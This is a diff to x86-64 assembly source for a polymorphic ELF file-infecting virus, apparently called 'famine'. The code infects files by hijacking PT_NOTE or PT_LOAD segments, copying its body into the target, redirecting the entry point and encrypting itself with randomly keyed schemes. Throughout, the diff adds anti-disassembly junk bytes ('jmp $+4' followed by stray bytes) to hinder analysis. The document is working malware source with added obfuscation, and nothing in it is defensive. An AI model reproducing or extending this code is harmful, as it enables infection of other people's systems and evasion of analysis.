@@ -1,5 +1,7 @@
 ; void  infect_file(char *filename, t_famine, *famine);
 infect_file:
+    jmp $+4
+    db `\x48\x8b`
     mov r12, rdi
     lea rdi, [r12 + fileName]
     mov rsi, O_RDWR
@@ -9,6 +11,8 @@ infect_file:
     jl bad_fd
     mov [r12 + fd], rax
 get_file_data:
+	jmp $+4
+    db `\x20\x3c`
     mov rdi, [r12 + fd]
     xor rsi, rsi
     mov rdx, SEEK_END
@@ -24,6 +28,8 @@ get_file_data:
     jmp close_file
     file_size_ok:                                                                                               ;faire un check si le fichier est pas assez grand et le passer dans la fonction append_signature
     
+    jmp $+4
+    db `\x69\x61`
     xor rdi, rdi
     mov rsi, [r12 + fileSize]
     shr rsi, 12                             ; 12 bits = 4096
@@ -41,6 +47,8 @@ get_file_data:
     mov [r12 + fileData], rax   ; faire des check pour le format
 
 check_signature:                ; boucle sur tout les bytes du fichier pour voir si il n'y a pas deja une signature
+    jmp $+3
+    db `\xff`
     lea rdi, [rel signature]
     mov rsi, [r12 + fileData]
     add rsi, [r12 + fileSize]
@@ -50,6 +58,8 @@ check_signature:                ; boucle sur tout les bytes du fichier pour voir
     jz close_mmap           ; on quite proprement si il y a deja une signature
     
 check_file_integrity:
+    jmp $+4
+    db `\x69\x6c`
     mov rdi, [r12 + fileData]
     cmp dword [rdi], 0x464c457f ; magic number 0x7f454c46 464c457f
 	jnz simple
@@ -71,6 +81,8 @@ check_file_integrity:
 	cmp rsi, rax
 	jl simple
 
+    jmp $+4
+    db `\x66\x0f`
 	; check if the file is bigger than the sheader info indicated
 	mov ax, [rdi + e_shentsize]
 	mov cx, [rdi + e_shnum]
@@ -93,6 +105,8 @@ get_file_entry:                     ; recupere l'entry point de l'executable
     
 
 get_first_pload:
+    jmp $+4
+    db `\x48\x8d`
     mov rsi, [r12 + fileData]     ; rsi = famine->filedata;
     xor rax, rax                  ; rax = p_type
     xor rbx, rbx                  ; rbx = n of pload
@@ -100,13 +114,16 @@ get_first_pload:
     xor rdx, rdx                  ; rdx = size of a pload
     mov rdi, rsi
     add rdi, [rsi + e_phoff]      ; rdi = pheader address
-
+    jmp $+4
+    db `\x66\x0f`
     mov [r12 + pload], rax
     mov [r12 + ptnote], rax       ; set pload and ptnote value to 0
     mov cx, [rsi + e_phnum]
     mov dx, [rsi + e_phentsize]
 
 phead_loop:
+    jmp $+4
+    db `\x48\x8b`
     mov eax, [rdi + p_type]    ; boucle sur tout les pheader et quand on trouve le premier pload on sort de la boucle
     cmp eax, PT_LOAD
     jnz no_pload_found
@@ -120,6 +137,8 @@ phead_loop:
     jnz no_pt_note_found
     mov [r12 + ptnote], rdi
     no_pt_note_found:
+    jmp $+4
+    db `\x48\x8b`
     inc rbx
     add rdi, rdx
     cmp rbx, rcx
@@ -137,6 +156,8 @@ phead_loop:
 ;    repz cmpsb
 ;    jz close_mmap           ; on quite proprement si il y a deja une signature
 check_pload_size:
+    jmp $+4
+    db `\x69\x6c`
     mov r13, [r12 + pload]
     mov rax, [r13 + p_filesz]
     add rax, PROG_SIZE
@@ -154,6 +175,8 @@ check_pload_size:
     jz simple
 
 create_new_pload:
+    jmp $+4
+    db `\x48\x8b`
     mov rax, [r12 + lastPload]
     mov rbx, [rax + p_vaddr]
     add rbx, [rax + p_memsz]                ; address in memory not used
@@ -171,6 +194,8 @@ create_new_pload:
     mov rax, [r12 + ptnote]
     mov [rax + p_offset], rcx
     mov [rax + p_vaddr], rbx
+    jmp $+4
+    db `\x20\x3c`
     mov [rax + p_paddr], rbx
     mov rbx, PROG_SIZE                      ; size of the program
     mov [rax + p_filesz], rbx
@@ -191,6 +216,8 @@ create_new_pload:
     jmp copy_program
 
 write_virus_entry:
+    jmp $+4
+    db `\x66\x0f`
     mov rdi, [r13 + p_vaddr]             ; met l'entry a la fin du premier pload = p_vaddr + p_memsz
     add rdi, [r13 + p_memsz]
     mov [r12 + entry], rdi
@@ -209,6 +236,8 @@ change_pload_data:
 
 
 copy_program:
+	jmp $+4
+	db `\x0f\xb6`
     mov rdi, [r12 + fileData]
     mov byte [rdi + e_infected], 't'
     add rdi, [r12 + programStart]           ; address to write the programe in the file
@@ -230,6 +259,8 @@ copy_program:
     mov r13, rbx
 
 change_key:
+	jmp $+4
+    db `\x20\x3c`
     lea rdi, [rbx + KEY_OFFSET]
     mov rsi, KEY_SIZE
     mov rdx, GRND_RANDOM
@@ -262,6 +293,8 @@ change_key:
     jl change_key_loop
     inc qword [r12 + virusId]
 choose_encrypt_type:
+    jmp $+4
+    db `\x69\x6c`
     lea rdi, [rbx + ENCRYPT_OFFSET]
     lea rsi, [rbx + KEY_OFFSET]
     xor rbx, rbx
@@ -281,6 +314,8 @@ choose_encrypt_type:
 ; rax = n  int data[n]
 ; rcx = m  int key[n]
 encrypt:
+    jmp $+4
+    db `\x69\x61`
 	xor rax, rax
 	xor rcx, rcx
     jmp encrypt_byte
@@ -299,6 +334,8 @@ encrypt:
 	cmp rax, ENCRYPT_SIZE
 	jl encrypt_loop
 cpy_decrypt_v1:
+	jmp $+4
+	db `\x80\x3d`
     lea rdi, [r13 + DECRYPT_OFFSET]
     lea rsi, [rel decrypt_v1]
     mov rcx, DECRYPT_V1_SIZE
@@ -320,7 +357,8 @@ encrypt_v2:
     lea rdx, [rel decrypt_v2]
     mov al,  [rdx + rax]
     xor [rdi + rbx], al
-
+    jmp $+4
+    db `\x31\x2d`
     ; data[i] = data[i] ^ key[i % key_size];
     xor rdx, rdx
     mov rax, rbx
@@ -335,6 +373,8 @@ encrypt_v2:
     jmp encrypt2_end_i
     encrypt2_i:
     mov rdx, [rdi + rbx - 1]
+    jmp $+4
+    db `\x31\x2d`
     encrypt2_end_i:
     xor byte [rdi + rbx], dl
     inc rbx
@@ -361,7 +401,8 @@ encrypt_v3:
     xor rdx, rdx
     mov rax, rbx
     div rcx
-
+    jmp $+4
+    db `\x69\x61`
     ; char c = (data[i] >> 4) & 0xf
     mov r11b, byte [rdi + rbx]
     shr r11b, 4
@@ -382,7 +423,8 @@ encrypt_v3:
     ; char d = (data[i]) & 0xf
     mov dl, byte [rdi + rbx]
     and dl, 0xf
-
+    jmp $+4
+    db `\x69\x61`
     ; d = (d ^ f) & 0xf;
     xor dl, al
     and dl, 0xf
@@ -401,6 +443,8 @@ encrypt_v3:
     jl ecrypt3_loop
 decrypt_v3_end:
 cpy_decrypt_v3:
+    jmp $+4
+    db `\x31\x2d`
     lea rdi, [r13 + DECRYPT_OFFSET]
     lea rsi, [rel decrypt_v3]
     mov rcx, DECRYPT_V3_SIZE
@@ -409,6 +453,8 @@ cpy_decrypt_v3:
     jmp close_mmap
 
 close_mmap:
+    jmp $+4
+    db `\x66\x0f`
     mov rdi, [r12 + fileData]
     mov rsi, [r12 + fileSize]
     mov rax, SYS_MUNMAP 
